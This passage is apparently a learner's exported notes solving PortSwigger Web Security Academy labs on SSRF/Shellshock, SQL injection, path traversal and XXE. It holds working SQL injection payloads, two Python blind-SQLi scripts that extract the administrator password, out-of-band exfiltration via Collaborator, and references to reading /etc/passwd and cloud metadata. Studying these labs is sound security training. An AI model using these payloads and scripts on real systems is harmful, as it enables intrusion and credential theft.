+</p><p id="1832063d-f08b-8002-b3ad-dff8d9d718c1" class="">
+</p></details></li></ul><ul id="1832063d-f08b-805a-bfb3-c28016e0faae" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation">https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation</a></summary><figure id="1832063d-f08b-80f4-9bcb-f11ea9e46938" class="image"><a href="image%20135.png"><img style="width:652px" src="image%20135.png"/></a></figure><p id="1832063d-f08b-80e2-992a-d521fce0c3ff" class="">first add the scop and then check  this target ⇒ site map ⇒ issue </p><figure id="1832063d-f08b-80c3-ab12-ed94755a98a9" class="image"><a href="image%20136.png"><img style="width:652px" src="image%20136.png"/></a></figure><p id="1832063d-f08b-80fa-8314-ed5c21f8df9c" class="">send this request into repeter and change some parameter </p><p id="1832063d-f08b-80e1-955a-fbd7ec562d45" class="">in user-agent  we have the collabarator server link and copy into colipboard </p><p id="1832063d-f08b-80d3-b674-ff7889f542fc" class="">
+</p><figure id="1832063d-f08b-80a2-9d83-fda8ba7a5385" class="image"><a href="image%20137.png"><img style="width:652px" src="image%20137.png"/></a></figure><p id="1832063d-f08b-8036-a2ac-ef0c8d9d1c58" class="">send the above request in to <code>intruder </code>and change the check the valid ip address <code>192.168.0.&amp;1&amp;:8080</code></p><figure id="1832063d-f08b-80f7-8b22-f7985af1fd50" class="image"><a href="image%20138.png"><img style="width:652px" src="image%20138.png"/></a></figure><p id="1832063d-f08b-8039-bca3-caaa38227dc0" class="">then goto collabrotor and click pull now button  you will get the user and it’s os name</p><figure id="1832063d-f08b-8061-ab12-c7207f400f6c" class="image"><a href="image%20139.png"><img style="width:652px" src="image%20139.png"/></a></figure><p id="1832063d-f08b-800d-842d-dc8e4b90e1e4" class="">
+</p><p id="1832063d-f08b-8077-bf4b-e80dbbc1ee3b" class="">
+</p></details></li></ul><ul id="1832063d-f08b-8075-a712-f9414c9bfc18" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter">https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter</a></summary><figure id="1832063d-f08b-8006-a2f0-e500f7b2ee36" class="image"><a href="image%20140.png"><img style="width:652px" src="image%20140.png"/></a></figure><p id="1832063d-f08b-803f-b34c-c6bbe52ceb9f" class="">
+</p><figure id="1832063d-f08b-803a-a976-e9d7dc1b5d4a" class="image"><a href="image%20141.png"><img style="width:652px" src="image%20141.png"/></a></figure><figure id="1832063d-f08b-80d1-b3ea-dfc706cf1f6a" class="image"><a href="image%20142.png"><img style="width:1920px" src="image%20142.png"/></a></figure><figure id="1832063d-f08b-800b-9ff1-c636e9d82cd3" class="image"><a href="image%20143.png"><img style="width:652px" src="image%20143.png"/></a></figure><figure id="1832063d-f08b-8080-98e8-d0a1ce60baf6" class="image"><a href="image%20144.png"><img style="width:652px" src="image%20144.png"/></a></figure><figure id="1832063d-f08b-8051-b2e2-ea60d65b7d4a" class="image"><a href="image%20145.png"><img style="width:652px" src="image%20145.png"/></a></figure><figure id="1832063d-f08b-804b-973b-c5aae8acc144" class="image"><a href="image%20146.png"><img style="width:652px" src="image%20146.png"/></a></figure><figure id="1832063d-f08b-8095-9a2a-e1be402876bc" class="image"><a href="image%20147.png"><img style="width:652px" src="image%20147.png"/></a></figure><figure id="1832063d-f08b-80aa-b005-edcd989a974f" class="image"><a href="image%20148.png"><img style="width:652px" src="image%20148.png"/></a></figure></details></li></ul></details></li></ul><ul id="1832063d-f08b-8063-8446-c51679906787" class="toggle"><li><details open=""><summary><strong>SQL Injection</strong></summary><ul id="1832063d-f08b-801f-8aea-ddd39b245594" class="toggle"><li><details open=""><summary><strong>Introduction to SQL Injection</strong></summary><figure id="1ae2063d-f08b-8023-9511-f026783f2ca7" class="image"><a href="image%20149.png"><img style="width:654px" src="image%20149.png"/></a></figure><figure id="1ae2063d-f08b-8030-9676-dd58766cf888" class="image"><a href="image%20150.png"><img style="width:654px" src="image%20150.png"/></a></figure></details></li></ul><ul id="1ae2063d-f08b-80e8-bdaa-ea66b2745b35" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data">https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data</a></summary><figure id="1b32063d-f08b-8094-b7bb-c3c579747ad5" class="image"><a href="image%20151.png"><img style="width:654px" src="image%20151.png"/></a></figure><p id="1b32063d-f08b-809a-9428-f191bd8a401e" class=""><code>given:<br/>SELECT * FROM products WHERE category = &#x27;Gifts&#x27; AND released = 1<br/></code></p><p id="1b32063d-f08b-803d-a699-f7e7ba9ec845" class=""><code>SELECT * FROM products WHERE category = &#x27;1&#x27; or 1=1 AND released = 1</code></p><p id="1b32063d-f08b-8066-9976-c2d73669ae62" class=""><code>explanation: check if one condition is true then ans. will be true ex. gifts = 1 then or 1=1 in the image gifts is not equals to 1 so, this condition will always false but, 1=1 this condition always true sow you will get the full table.</code></p><figure id="1b32063d-f08b-803c-9fb9-e725890b824c" class="image"><a href="image%20152.png"><img style="width:653.9874877929688px" src="image%20152.png"/></a></figure><p id="1b32063d-f08b-8070-926d-d4e5d2380640" class=""><code>Note: but, i have to comment  &#x27;AND released =1&#x27; this thing from the query so, i can write this like:</code></p><p id="1b32063d-f08b-8070-b7f6-ef6fcb946e1e" class=""><code>SELECT * FROM products WHERE category = &#x27;1&#x27; or 1=1-- (AND released = 1)</code></p><p id="1b32063d-f08b-80ae-ac86-f307d47e097e" class=""><code>after &#x27;--&#x27;comment this (AND released = 1) thing</code></p><p id="1b32063d-f08b-8011-bc9a-f9d47b1fe585" class=""><code>final payload: 1&#x27; or 1=1--</code></p><figure id="1b32063d-f08b-80f8-b2e8-fe939bbf1bf7" class="image"><a href="image%20153.png"><img style="width:654px" src="image%20153.png"/></a></figure><p id="1b32063d-f08b-807f-ac4e-e6fe93b17d7f" class="">
+</p><p id="1b32063d-f08b-8070-9231-c17df53449c7" class="">
+</p><p id="1b32063d-f08b-8071-89ad-d8dd23bec45b" class="">
+</p><p id="1b32063d-f08b-801d-abb4-d5fcc170a2d8" class="">
+</p></details></li></ul><ul id="1b32063d-f08b-802a-91c4-c809446b83a2" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass">https://portswigger.net/web-security/sql-injection/lab-login-bypass</a></summary><p id="1b32063d-f08b-80a0-b213-f71f3bf5e286" class="">username: <code>administrator’ or 1=1--</code></p><p id="1b32063d-f08b-80d8-8489-c32e5acc0cd5" class="">password:  anything</p><p id="1b32063d-f08b-806e-b433-c8d6cbc47977" class="">payload : <code>administrator’ or 1=1--</code></p></details></li></ul><ul id="1b32063d-f08b-8052-8b3e-d09b7c824bc7" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle</a></summary><figure id="1b32063d-f08b-80f0-9c4e-e8f425ed1b18" class="image"><a href="image%20154.png"><img style="width:654px" src="image%20154.png"/></a></figure><figure id="1b32063d-f08b-8049-92b1-c13e9f6b6af0" class="image"><a href="image%20155.png"><img style="width:654px" src="image%20155.png"/></a></figure><p id="1b32063d-f08b-8034-b9be-d2993abdb29d" class="">
+</p><p id="1b32063d-f08b-8000-a197-dde77dba5092" class="">step 1 : access the lab and click the one of the product and see the GET request in proxy in burpsuite → repeter change the category parameter for know the version of oracle DB version in to  <code>SELECT banner FROM v$version</code> </p><p id="1b32063d-f08b-8028-9f01-fa49cc8e223d" class="">payload used in category perameter : <code>1’ UNION  SELECT banner FROM v$version--</code></p><figure id="1b32063d-f08b-80ef-84e9-fcede7a78117" class="image"><a href="image%20156.png"><img style="width:1920px" src="image%20156.png"/></a></figure><p id="1b32063d-f08b-801e-a14c-f7a16d60790a" class="">
+</p></details></li></ul><ul id="1b32063d-f08b-80af-898b-fffc5879943d" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft</a></summary><figure id="1b32063d-f08b-80d1-a046-cb720097f688" class="image"><a href="image%20157.png"><img style="width:654px" src="image%20157.png"/></a></figure><p id="1b32063d-f08b-805f-9ebd-debf35723f9c" class="">same as lest lab </p><p id="1b32063d-f08b-806a-be2f-f2d327ab87ed" class=""><code>GET /filter?category=1&#x27; UNION SELECT @@version,null# HTTP/2</code></p><p id="1b32063d-f08b-804b-a0e9-de8408b167ff" class="">payload : <code>1&#x27; UNION SELECT @@version,null#</code></p><p id="1b32063d-f08b-80ab-86f5-ef4a53744bec" class="">encoded payload then put it in category paramenter</p><p id="1b32063d-f08b-80b8-9e9d-c985612f1e5b" class="">encoded payload : <code>1&#x27;+UNION+SELECT+%40%40version,null%23</code></p><p id="1b32063d-f08b-8096-9a28-cbeb06603b93" class="">
+</p><p id="1b32063d-f08b-809b-a1da-c7c1775b33dd" class="">Congratulations, you solved the lab!</p></details></li></ul><ul id="1b32063d-f08b-8008-944c-d89375fc6602" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle</a></summary><figure id="1b32063d-f08b-801f-b88e-d82fb1687099" class="image"><a href="image%20158.png"><img style="width:654px" src="image%20158.png"/></a></figure><figure id="1b32063d-f08b-80bc-927c-c7f27d6267da" class="image"><a href="image%20159.png"><img style="width:654px" src="image%20159.png"/></a></figure><p id="1b32063d-f08b-80b0-8eb7-ec9f4d53b394" class=""><code>GET /filter?category=&#x27; ORDER BY 2-- HTTP/2</code> </p><ul id="1b32063d-f08b-80da-9f41-f0a7425b86b0" class="bulleted-list"><li style="list-style-type:disc">⇒ two columns </li></ul><ul id="1b32063d-f08b-80ac-8eac-e7b6176e8957" class="bulleted-list"><li style="list-style-type:disc"><code>GET /filter?category=&#x27;+UNION+SELECT+table_name,null+FROM+information_schema.tables-- HTTP/2</code></li></ul><ul id="1b32063d-f08b-803b-9058-fa53d953d136" class="bulleted-list"><li style="list-style-type:disc"></li></ul><figure id="1b32063d-f08b-8096-b26e-c62509b4c543" class="image"><a href="image%20160.png"><img style="width:654px" src="image%20160.png"/></a></figure><figure id="1b32063d-f08b-80ba-9ffd-e78c1d264e98" class="image"><a href="image%20161.png"><img style="width:654px" src="image%20161.png"/></a></figure><ul id="1b32063d-f08b-807a-9ad6-ebff26a5ead4" class="bulleted-list"><li style="list-style-type:disc">name of all tables </li></ul><ul id="1b32063d-f08b-80ec-85e4-c303a500b83d" class="bulleted-list"><li style="list-style-type:disc">find the uniqe table name  like i have found this one </li></ul><ul id="1b32063d-f08b-800a-88fe-d6c62255722e" class="bulleted-list"><li style="list-style-type:disc"></li></ul><figure id="1b32063d-f08b-8004-8af1-c8d7f9b68f3c" class="image"><a href="image%20162.png"><img style="width:654px" src="image%20162.png"/></a></figure><p id="1b32063d-f08b-80a3-9214-d746e021f4e0" class="">
+</p><ul id="1b32063d-f08b-807f-823c-cfe8cdfff37c" class="bulleted-list"><li style="list-style-type:disc">NOTE :  while doing this lab again the lab was canceled  the lab and the new table name is <code>users_eyidjg</code>  from this  <code>users_hayxil </code>  </li></ul><p id="1b32063d-f08b-8063-92b5-e35852226a63" class="">
+</p><figure id="1b32063d-f08b-8006-8769-f6cf59defae6" class="image"><a href="image%20163.png"><img style="width:654px" src="image%20163.png"/></a></figure><figure id="1b32063d-f08b-800a-bd84-ec3b7fbc2065" class="image"><a href="image%20164.png"><img style="width:653.9874877929688px" src="image%20164.png"/></a></figure><p id="1b32063d-f08b-8080-b8ed-d0890c40634d" class="">for login  :</p><p id="1b32063d-f08b-808f-bf4d-d9c4133cc05c" class="">username: <code>administrator</code></p><p id="1b32063d-f08b-80ef-a896-c112ec0ab875" class="">password:<code>y78p8ihwwwe4eq4iy50a</code></p><figure id="1b32063d-f08b-80da-b483-e4dd31513996" class="image"><a href="image%20165.png"><img style="width:654px" src="image%20165.png"/></a></figure><p id="1b32063d-f08b-80c2-b406-e64cbea042dc" class="">
+</p><p id="1b32063d-f08b-8076-a39d-e2ea5f609fb3" class="">
+</p><p id="1b32063d-f08b-80d1-923c-cc1b34b173a0" class="">
+</p><p id="1b32063d-f08b-80c6-a92e-ebfc38a9a83d" class="">
+</p></details></li></ul><ul id="1b32063d-f08b-80e4-84a1-c317c8998ea8" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle</a></summary><figure id="1b42063d-f08b-80c3-a1d1-e50c354216fb" class="image"><a href="image%20166.png"><img style="width:654px" src="image%20166.png"/></a><figcaption>there is no more then 2 column’s</figcaption></figure><p id="1b42063d-f08b-8073-815b-f2041f8667fd" class="">
+</p><figure id="1b42063d-f08b-8057-a5bc-eafbe7be9557" class="image"><a href="image%20167.png"><img style="width:653.9750366210938px" src="image%20167.png"/></a><figcaption>i have found the name of table <code>USERS_SXMYYJ</code></figcaption></figure><figure id="1b42063d-f08b-809f-b4ef-d7bcaca98b47" class="image"><a href="image%20168.png"><img style="width:654px" src="image%20168.png"/></a><figcaption>i have found the column’s of  password and column (extra is email no need )</figcaption></figure><p id="1b42063d-f08b-80f6-987d-dbd13991521d" class="">
+</p><figure id="1b42063d-f08b-80fb-8e26-c2d01344b9c8" class="image"><a href="image%20169.png"><img style="width:654px" src="image%20169.png"/></a><figcaption>i have found  the table  of users corresponding their password</figcaption></figure><table id="1b42063d-f08b-8064-9440-d55e0bfd8cf7" class="simple-table"><tbody><tr id="1b42063d-f08b-80ca-a68d-d691af8f6674"><td id="`}wF" class="">users_name</td><td id="oYJh" class="">password</td></tr><tr id="1b42063d-f08b-80e2-9760-d6a0ca3d8acf"><td id="`}wF" class="">wiener</td><td id="oYJh" class="">5aaih745ww0hlu4f6tbq</td></tr><tr id="1b42063d-f08b-8009-8221-daf70103124e"><td id="`}wF" class="">carlos</td><td id="oYJh" class="">j3go7tggs5dol7tflt39</td></tr><tr id="1b42063d-f08b-80e5-8a54-d4ea4e1dd9d6"><td id="`}wF" class="">administrator</td><td id="oYJh" class="">olnx3vy1g94y4qscueho</td></tr></tbody></table><p id="1b42063d-f08b-80ea-9903-e1d04335a8b2" class="">i suppose in this format </p></details></li></ul><ul id="1b42063d-f08b-803b-9337-e16e293078d8" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns</a></summary><figure id="1b42063d-f08b-8081-906a-c8f5369e46c5" class="image"><a href="image%20170.png"><img style="width:654px" src="image%20170.png"/></a></figure><p id="1b42063d-f08b-8070-9af1-ec760c4a3c5f" class="">
+</p><p id="1b42063d-f08b-8096-abd6-c036f2d27c01" class=""> NOTE : this   <code>&#x27;+UNION+SELECT+null,null,null--</code>  and  this   <code>‘ ORDER BY 3--</code>  works some </p><p id="1b42063d-f08b-8009-b939-d6dcd915af14" class="">
+</p></details></li></ul><ul id="1b42063d-f08b-80f4-9341-cf55c276be3d" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text</a></summary><figure id="1b42063d-f08b-80f3-9b21-f5bf1f8795ad" class="image"><a href="image%20171.png"><img style="width:654px" src="image%20171.png"/></a></figure><p id="1b42063d-f08b-808a-911f-c954dbdd6182" class="">GET /filter?category=<code>&#x27;+UNION+SELECT+null,&#x27;QJwwQv&#x27;,null--</code> HTTP/2  </p><p id="1b42063d-f08b-8076-8e1d-f403b246c3e7" class="">the end goal is print the  <code>QJwwQv</code> string in database</p><p id="1b42063d-f08b-806f-8270-d0e94eef9f11" class="">in sql  :  SELECT NULL;  the select query works as print (ex. print(None)) . select print null means nothing it none!</p><p id="1b42063d-f08b-80e1-af47-d14bdd8010f5" class="">
+</p><p id="1b42063d-f08b-80e6-956d-c414b56db93f" class="">
+</p></details></li></ul><ul id="1b42063d-f08b-80d9-a60f-ecc4f13ac7be" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables">https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables</a></summary><figure id="1b42063d-f08b-802c-8685-dd793dd758f9" class="image"><a href="image%20172.png"><img style="width:654px" src="image%20172.png"/></a></figure><p id="1b42063d-f08b-8084-a01c-d2243a09aa19" class="">
+</p><p id="1b42063d-f08b-80e2-9542-c37ea4238a75" class="">
+</p></details></li></ul><ul id="1b42063d-f08b-8056-a24f-dcde050de4a0" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column">https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column</a></summary><figure id="1b42063d-f08b-80b5-b6cf-f8f5cec77d5c" class="image"><a href="image%20173.png"><img style="width:654px" src="image%20173.png"/></a></figure></details></li></ul><ul id="1b62063d-f08b-8078-8fea-eeeaa3632c88" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses">https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses</a></summary><ul id="1b62063d-f08b-80c9-870b-f6e70e757ac4" class="toggle"><li><details open=""><summary>Script used in this lab: </summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1b62063d-f08b-80f4-a4c8-c35700668dd9" class="code"><code class="language-Python">import requests
+
+# Target URL
+url = &#x27;https://0ad6005603a8d3268c99591e00c6000d.web-security-academy.net/filter?category=Pets&#x27;
+
+# Possible characters in the password
+characters = &#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;
+
+# Session cookies
+cookie = {&#x27;TrackingId&#x27;: &#x27;aK606hO9H9bDQFlk&#x27;, &#x27;session&#x27;: &#x27;m7sPsUWE4FbkJdznk8jQNQGCWSEJifgT&#x27;}
+
+def get_length():
+    &quot;&quot;&quot;Finds the length of the administrator password.&quot;&quot;&quot;
+    for i in range(1, 101):
+        payload = f&quot;&#x27; AND (SELECT LENGTH(password) FROM users WHERE username=&#x27;administrator&#x27;) = {i}--&quot;
+        cookie[&#x27;TrackingId&#x27;] = &#x27;aK606hO9H9bDQFlk&#x27; + payload
+        r = requests.get(url, cookies=cookie)
+        if &#x27;Welcome back!&#x27; in r.text:
+            return i
+
+def get_data(length):
+    &quot;&quot;&quot;Extracts the password one character at a time.&quot;&quot;&quot;
+    password = &quot;&quot;
+    for i in range(1, length + 1):
+        for char in characters:
+            payload = f&quot;&#x27; AND SUBSTRING((SELECT password FROM users WHERE username=&#x27;administrator&#x27;), {i}, 1) = &#x27;{char}&#x27;--&quot;
+            cookie[&#x27;TrackingId&#x27;] = &#x27;aK606hO9H9bDQFlk&#x27; + payload
+            r = requests.get(url, cookies=cookie)
+            if &#x27;Welcome back!&#x27; in r.text:
+                password += char
+                print(f&quot;Found character {i}: {char}&quot;)
+                break  # Move to the next character
+    return password
+
+# Step 1: Get password length
+length = get_length()
+print(f&quot;Password length: {length}&quot;)
+
+# Step 2: Extract password
+print(&quot;Dumping Data... please wait.&quot;)
+password = get_data(length)
+print(f&quot;Got it! Password: {password}&quot;)
+</code></pre><p id="1b62063d-f08b-8096-8fe6-cd2932b001c3" class="">
+</p></details></li></ul><ul id="1b62063d-f08b-8017-86d5-ce9a7e4125fe" class="bulleted-list"><li style="list-style-type:disc">NOTE: you have to change some values in this python script</li></ul></details></li></ul><ul id="1b62063d-f08b-801f-a2b9-d8baf792e8f1" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors">https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors</a></summary><ul id="1b62063d-f08b-80db-8f09-c3ca5a926ad9" class="toggle"><li><details open=""><summary>Script used in this lab :</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1b62063d-f08b-80aa-bb90-cddc551838ca" class="code"><code class="language-Python">import requests
+
+# Target URL
+url = &#x27;https://0a2000f104f345b5807053bb003e00e3.web-security-academy.net/filter?category=Lifestyle&#x27;
+
+# Possible characters in the password
+characters = &#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;
+
+# Session cookies
+cookie = {&#x27;TrackingId&#x27;: &#x27;ZLoKvnKI6qicdS4X&#x27;, &#x27;session&#x27;: &#x27;Lpq6MPgcZWalrBCKrxSggcRMWdWObEBK&#x27;}
+
+def get_length():
+    &quot;&quot;&quot;Finds the length of the administrator password.&quot;&quot;&quot;
+    for i in range(1, 101):
+        payload = f&quot;&#x27; || (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username=&#x27;administrator&#x27;)) = {i}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||&#x27;&quot;
+        cookie[&#x27;TrackingId&#x27;] = &#x27;ZLoKvnKI6qicdS4X&#x27; + payload
+        r = requests.get(url, cookies=cookie)
+        if  r.status_code == 500:
+            return i
+
+def get_data(length):
+    &quot;&quot;&quot;Extracts the password one character at a time.&quot;&quot;&quot;
+    password = &quot;&quot;
+    for i in range(1, length + 1):
+        for char in characters:
+            payload = f&quot;&#x27; || (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=&#x27;administrator&#x27;),{i},1) = &#x27;{char}&#x27;) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||&#x27;&quot;
+            cookie[&#x27;TrackingId&#x27;] = &#x27;ZLoKvnKI6qicdS4X&#x27; + payload
+            r = requests.get(url, cookies=cookie)
+            if  r.status_code == 500:
+                print(password)
+                password += char
+                print(f&quot;Found character {i}: {char}&quot;)
+                break  # Move to the next character
+    return password
+
+# Step 1: Get password length
+length = get_length()
+print(f&quot;Password length: {length}&quot;)
+
+# Step 2: Extract password
+print(&quot;Dumping Data... please wait.&quot;)
+password = get_data(length)
+print(f&quot;Got it! Password: {password}&quot;)
+</code></pre></details></li></ul><ul id="1b62063d-f08b-8002-a277-e12d8d343ac1" class="bulleted-list"><li style="list-style-type:disc">NOTE: you have to change some values in this python script</li></ul></details></li></ul><ul id="1b62063d-f08b-80dd-a596-da1f4fc1a098" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based">https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based</a></summary><figure id="1b62063d-f08b-806a-9132-e1cfd736fac0" class="image"><a href="image%20174.png"><img style="width:654px" src="image%20174.png"/></a></figure><p id="1b62063d-f08b-800e-8ea4-dd3d004481b0" class=""><code>&#x27; AND SELECT CAST((SELECT password FROM users LIMIT 1 OFFSET 3 ) As INT)--</code></p><p id="1b62063d-f08b-8040-8d51-c1386e9385f3" class="">output of the above query:<br/>list of password in table=&gt;<br/>password1<br/>password2<br/>password3<br/>password4<br/></p><p id="1b62063d-f08b-80be-a6b8-c4fdc515b509" class="">explination: LIMIT 1 select only  the password4  by OFFSET query besides the all above password (password1,password2,password3)</p></details></li></ul><ul id="1b62063d-f08b-8082-ac0e-f61d5241be6e" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays">https://portswigger.net/web-security/sql-injection/blind/lab-time-delays</a></summary><figure id="1b62063d-f08b-8046-a521-ddcb5940b5ec" class="image"><a href="image%20175.png"><img style="width:654px" src="image%20175.png"/></a></figure></details></li></ul><ul id="1b62063d-f08b-8050-b474-ff0c20ef27dc" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval">https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval</a></summary><p id="1b62063d-f08b-80d8-be15-ee4d0ae8dd55" class="">
+</p></details></li></ul><ul id="1b62063d-f08b-809b-b458-d0f2187454df" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band">https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band</a></summary><figure id="1b62063d-f08b-8030-8020-e7ac4e6715c8" class="image"><a href="image%20176.png"><img style="width:654px" src="image%20176.png"/></a></figure><p id="1b62063d-f08b-8039-bcbe-e0f5e577fb23" class="">use  burpsuitepro   <code>Burp Collaborator&#x27;s </code> link default public server.</p></details></li></ul><ul id="1b62063d-f08b-8079-8bfd-c843856d9f35" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration">https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration</a></summary><figure id="1b62063d-f08b-803b-bc2e-e9590585cc7f" class="image"><a href="image%20177.png"><img style="width:654px" src="image%20177.png"/></a></figure><p id="1b62063d-f08b-809e-8c9c-e813a7cb8fc0" class="">copy burp  Burp Collaborator&#x27;s link</p><figure id="1b62063d-f08b-8008-80b8-ff2ebf781d03" class="image"><a href="image%20178.png"><img style="width:654px" src="image%20178.png"/></a></figure><p id="1b62063d-f08b-80c5-be81-e2ea8703a16f" class="">check collaborator’s and put now </p><figure id="1b62063d-f08b-80bf-9799-c84af9583862" class="image"><a href="image%20179.png"><img style="width:654px" src="image%20179.png"/></a></figure><p id="1b62063d-f08b-809b-9fc2-fc16cb48fcb9" class="">then you can see the password</p></details></li></ul><ul id="1b62063d-f08b-80a3-b18d-f2762a7c2c99" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding">https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding</a></summary><figure id="1b62063d-f08b-80dd-91d9-f56a9a655b48" class="image"><a href="image%20180.png"><img style="width:654px" src="image%20180.png"/></a></figure><p id="1b62063d-f08b-802f-a065-d73329c90d6d" class="">use extension ‘hackvector’ then encode inside the product <em>id  by using hackvector ⇒ ‘hash_enities’ </em></p></details></li></ul></details></li></ul><ul id="1b82063d-f08b-8082-8312-d4304ae05d05" class="toggle"><li><details open=""><summary>path traversal</summary><ul id="1b82063d-f08b-80a5-9b26-ee7545bf7069" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/file-path-traversal/lab-simple">https://portswigger.net/web-security/file-path-traversal/lab-simple</a></summary><figure id="1b82063d-f08b-8081-8c28-d3be9a9c23b6" class="image"><a href="image%20181.png"><img style="width:654px" src="image%20181.png"/></a></figure></details></li></ul></details></li></ul><ul id="1c02063d-f08b-80d0-b1c2-f6096523fc15" class="toggle"><li><details open=""><summary><strong>XML external entity (XXE) injection</strong></summary><ul id="1c02063d-f08b-80fd-8595-eef713961854" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files">https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files</a></summary><figure id="1c02063d-f08b-80f7-90ad-c5f48366307f" class="image"><a href="image%20182.png"><img style="width:654px" src="image%20182.png"/></a></figure><p id="1b62063d-f08b-809e-9bb4-d8dbf1e76677" class="">lab solved </p></details></li></ul><ul id="1c02063d-f08b-80d8-9a61-c6d34f46d646" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf">https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf</a></summary><figure id="1c02063d-f08b-8030-82e0-fc96314a39c3" class="image"><a href="image%20183.png"><img style="width:654px" src="image%20183.png"/></a></figure><p id="1c02063d-f08b-8031-b7ca-d9cff2b0715c" class="">user credentials file:///etc/passwd</p><p id="1c02063d-f08b-807e-a75f-d373961d7192" class="">
+</p><figure id="1c02063d-f08b-8040-84ad-fdc05d125c27" class="image"><a href="image%20184.png"><img style="width:654px" src="image%20184.png"/></a></figure><p id="1c02063d-f08b-80de-a237-ff2a8ff2a64d" class="">AWS’S EC2 meta-data</p><p id="1c02063d-f08b-80c4-8da3-e602781270ba" class="">
